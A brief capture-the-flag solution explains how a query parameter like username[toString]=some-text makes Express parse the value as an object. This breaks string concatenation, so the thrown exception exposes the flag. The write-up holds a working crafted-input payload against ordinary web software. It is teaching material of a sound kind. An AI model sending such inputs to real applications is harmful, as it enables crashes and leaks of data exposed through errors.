The solution is to make an HTTP request like this:

```
http://<host>/?username[toString]=some-text
```

The express library will make `req.query.username` look something like:

```
{
  "toString": "some-text"
}
```

Then, when this code runs:

```
        const output = 'Hello ' + username
```

it will try to call username.toString() to get a string form of the object.

However, since we have overwritten the builtin toString() function with
a string value, that attempt will throw an exception.

The exception then yields the flag.
